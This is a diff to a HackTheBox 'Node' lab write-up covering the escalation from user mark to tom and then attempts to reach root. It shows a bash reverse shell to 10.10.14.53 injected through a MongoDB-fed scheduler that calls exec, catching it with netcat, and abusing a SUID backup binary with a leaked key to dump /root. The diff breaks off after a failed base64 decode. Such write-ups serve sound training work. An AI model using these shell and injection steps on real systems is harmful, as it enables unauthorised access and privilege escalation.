@@ -386,7 +386,17 @@ tom       1199  0.0  5.9 1074616 45264 ?       Ssl  03:44   0:07 /usr/bin/node /
 ....
 ```
 
-The `services` section tells us that there is a process compiling the `app.js` file that is being run by Tom. Since we are trying to escalate our privileges to Toms’, I decided to investigate this file.
+While looking at the processes running on the machine, I found out two processes runnins tom
+
+```
+mark@node:/home$ ps auxww
+...[snip]...
+tom       1249  0.1  8.2 1064924 62392 ?       Ssl  Feb16   2:47 /usr/bin/node /var/www/myplace/app.js
+tom       1250  0.0  4.2 1075128 31860 ?       Ssl  Feb16   0:21 /usr/bin/node /var/scheduler/app.js
+...[snip]...
+```
+
+Since I was trying to escalate my privileges to Toms’, I decided to investigate this file.
 
 ```
 mark@node:/tmp$ ls -la /var/scheduler
@@ -402,5 +412,292 @@ drwxr-xr-x 19 root root 4096 Aug 16  2022 node_modules
 
 I only had the permissions to read the file, so I couldnt simply include a reverse shell in there. So, I decided to look at the contents of the file.
 
+```
+mark@node:~$ cat /var/scheduler/app.js
+const exec        = require('child_process').exec;
+const MongoClient = require('mongodb').MongoClient;
+const ObjectID    = require('mongodb').ObjectID;
+const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';
+
+MongoClient.connect(url, function(error, db) {
+  if (error || !db) {
+    console.log('[!] Failed to connect to mongodb');
+    return;
+  }
+
+  setInterval(function () {
+    db.collection('tasks').find().toArray(function (error, docs) {
+      if (!error && docs) {
+        docs.forEach(function (doc) {
+          if (doc) {
+            console.log('Executing task ' + doc._id + '...');
+            exec(doc.cmd);
+            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
+          }
+        });
+      }
+      else if (error) {
+        console.log('Something went wrong: ' + error);
+      }
+    });
+  }, 30000);
+
+});
+```
+
+This script will connect to the Mongo database, and then run a series of commands every 30 seconds. It will get items out of the `tasks` collection. For each doc, it will pass `doc.cmd` to `exec` to run it, and then delete the doc.
+
+The file also had credentials to connect to the DB using the Mongo client specifying the user, password, and database to connect to:
+
+```
+mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
+MongoDB shell version: 3.2.16
+connecting to: scheduler
+```
+
+In Mongo, a database (like `scheduler`) has collections (kind of like tables in SQL). The db had one collection
+
+```
+> show collections
+tasks
+```
+
+The collection had no objects in it.
+```
+> db.tasks.find()
+> 
+```
+
+Since, there was nothing in the collection, I decided to try and add a simple command to `touch` a file in `/tmp`:
+
+```
+> db.tasks.insert({"cmd": "touch /tmp/fak3r"})
+WriteResult({ "nInserted" : 1 })
+> db.tasks.find()
+{ "_id" : ObjectId("63f063be51ea017431088678"), "cmd" : "touch /tmp/fak3r" }
+```
 
 
+But now, as we read in the code that the files will be deleted in 30 secs, I waited to check if its true.
+
+```
+> db.tasks.find()
+> 
+```
+
+It was true, and when I went back to the `/tmp`, a new file was created which was owned by `tom`.
+
+```
+mark@node:/tmp$ ls -l fak3r 
+-rw-r--r-- 1 tom tom 0 Feb 18 05:36 fak3r
+```
+
+Now, that I could run commands and create files using the MongoDB as the user `tom`, I decided to insert a reverse shell into the DB as the command.
+
+```
+> db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.53/4444 0>&1'"})
+WriteResult({ "nInserted" : 1 })
+> db.tasks.find()
+{ "_id" : ObjectId("63f06b8bd95ca7076731c89d"), "cmd" : "bash -c 'bash -i >& /dev/tcp/10.10.14.53/4444 0>&1'" }
+```
+
+
+And after a few moments, I got back a connection through my `netcat` listener.
+
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Node]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.53] from (UNKNOWN) [10.10.10.58] 57944
+bash: cannot set terminal process group (1250): Inappropriate ioctl for device
+bash: no job control in this shell
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+tom@node:/$ whoami
+whoami
+tom
+```
+
+I tried to upgrade the shell but I couldn't:
+
+```
+tom@node:/$ python3 -c 'import pty;pty.spawn("bash")'
+python3 -c 'import pty;pty.spawn("bash")'
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+```
+
+So, I decided to grab the user flag.
+
+```
+tom@node:/$ cd /home/tom
+cd /home/tom
+tom@node:~$ cat user.txt
+cat user.txt
+[REDACTED]
+```
+
+## Privilege Escalation
+
+I decided to start with printing ot the user and group IDs of the user.
+
+```
+tom@node:/$ id
+id
+uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
+```
+
+The first thing that pop out was `sudo`, but trying to run `sudo` prompts for tom’s password, which I don’t have:
+
+```
+tom@node:~$ sudo su -
+[sudo] password for tom:
+```
+
+Looking at other groups, `adm` means that I can access all the logs, and that’s worth checking out, but admin is more interesting. It’s group id (gid) is above 1000, which means it’s a group created by an admin instead of by the OS, which means it’s custom. Looking for files with this group, there’s only one:
+
+```
+tom@node:/$ find / -group admin -ls 2>/dev/null
+find / -group admin -ls 2>/dev/null
+    56747     20 -rwsr-xr--   1 root     admin       16484 Sep  3  2017 /usr/local/bin/backup
+```
+
+It was also a SUID binary owned my root, which means that it runs as root.
+
+Interestingly, if you remember, the same file was called from the `/var/www/myplace/app.js` file.
+
+```javascript
+  app.get('/api/admin/backup', function (req, res) {                                                     
+    if (req.session.user && req.session.user.is_admin) {                                                 
+      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);                         
+      var backup = '';                                                                                   
+                                                    
+      proc.on("exit", function(exitCode) {                                                               
+        res.header("Content-Type", "text/plain");                                                        
+        res.header("Content-Disposition", "attachment; filename=myplace.backup");                        
+        res.send(backup);                                                                                
+      });                                                                                                
+                                                                                                         
+      proc.stdout.on("data", function(chunk) {                                                           
+        backup += chunk;                            
+      });        
+                                                    
+      proc.stdout.on("end", function() {          
+      });
+    }                                               
+    else {                                   
+      res.send({                                                                                         
+        authenticated: false                        
+      });                              
+    }                          
+  }); 
+```
+
+If you see the line where a variable `proc` is being defined,  you can see that `/usr/local/bin/backup` takes in 3 arguments:
+- the string `-q`
+- the backup key
+- A directory path
+
+Combining all 3 arguments, we get this:
+
+```
+/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp
+```
+
+We get a long, non-terminating ASCII text which is even difficult to scroll through, so I decided to output its result into a file, and it looked like it was Base64 encoded, so I decided to decode it and store its results into another folder.
+
+
+```
+tom@node:/tmp$ /usr/local/bin/backup -q '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /tmp > test
+<e72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /tmp > test           
+zip warning: No such device or address
+tom@node:/tmp$ file test
+file test
+test: ASCII text, with very long lines, with no line terminators
+tom@node:/tmp$ cat test | base64 --decode > test-decoded
+cat test | base64 --decode > test-decoded
+tom@node:/tmp$ file test-decoded 
+file test-decoded 
+test-decoded: Zip archive data, at least v1.0 to extract
+tom@node:/tmp$ 
+```
+
+So, now, I decided to unzip the file to take a look at its contents.
+
+```
+tom@node:/tmp$ unzip test-decoded
+unzip test-decoded
+Archive:  test-decoded
+   creating: tmp/
+   skipping: tmp/test                unable to get password
+   skipping: tmp/test-decoded        unable to get password
+   creating: tmp/.Test-unix/
+   creating: tmp/tmux-1001/
+   creating: tmp/.XIM-unix/
+   creating: tmp/vmware-root/
+   creating: tmp/systemd-private-bf7239279c7e4e73a3bf5b2ff3c94cde-systemd-timesyncd.service-N576I1/
+   creating: tmp/systemd-private-bf7239279c7e4e73a3bf5b2ff3c94cde-systemd-timesyncd.service-N576I1/tmp/
+   skipping: tmp/linpeas.sh          unable to get password
+   creating: tmp/.X11-unix/
+   creating: tmp/.ICE-unix/
+   creating: tmp/.font-unix/
+   skipping: tmp/fak3r               unable to get password
+```
+
+Now, that I was able to dump the contents of the `/tmp` directory using the command, i tried to see I was able to dump the contents of the `/root` directory
+
+Trying to read `/root` directory through `/usr/local/bin/backup` file
+```
+tom@node:/tmp$ /usr/local/bin/backup -q '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /root
+<e72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /root                 
+ [+] Finished! Encoded backup is below:
+                                                                                                                                                                                                                                                                                                                            
+UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==                                                        
+tom@node:/tmp$ /usr/local/bin/backup -q '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /root > root                                                                                                                                                                                                     
+<e72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /root > root                                                                                                                                                                                                                                                         
+tom@node:/tmp$ ls                                                                                                                                                                                                                                                                                                           
+ls                                                                                                                                                                                                                                                                                                                          
+fak3r                                                                                                                                                                                                                                                                                                                       
+linpeas.sh                                                                                                                                                                                                                                                                                                                  
+mongodb-27017.sock                                                                                                                                                                                                                                                                                                          
+root                                                                                                                                                                                                                                                                                                                        
+systemd-private-bf7239279c7e4e73a3bf5b2ff3c94cde-systemd-timesyncd.service-N576I1                                                                                                                                                                                                                                           
+test                                                                                                                                                                                                                                                                                                                        
+test-decoded                                                                                                                                                                                                                                                                                                                
+tmp                                                                                                                                                                                                                                                                                                                         
+tmux-1001                                                                                                                                                                                                                                                                                                                   
+vmware-root                                                                                                                                                                                                                                                                                                                 
+tom@node:/tmp$ cat root | base64 --decode                                                                                                                                                                                                                                                                                   
+cat root | base64 --decode                                                                                                                                                                                                                                                                                                  
+base64: invalid input                                                                                                                                                                                                                                                                                                       
+tom@node:/tmp$ cat root | base64 --decode > root-decoded                                                                                                                                                                                                                                                                    
+cat root | base64 --decode > root-decoded                                                                                                                                                                                                                                                                                   
+base64: invalid input                                                                                                                                                                                                                                                                                                       
+tom@node:/tmp$ cat root | base64 -d > root-decoded                                                                                                                                                                                                                                                                          
+cat root | base64 -d > root-decoded                                                                                                                                                                                                                                                                                         
+base64: invalid input 
+tom@node:/tmp$ ls  
+ls
+fak3r
+linpeas.sh
+mongodb-27017.sock
+root   
+root-decodedsystemd-private-bf7239279c7e4e73a3bf5b2ff3c94cde-systemd-timesyncd.service-N576I1  
+test
+test-decoded  
+tmp
+tmux-1001
+vmware-root                                                                   
+tom@node:/tmp$ file root-decoded                                             
+file root-decoded                                                             
+root-decoded: empty  
+```
+
+
+
+backup key
+```
+45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
+```
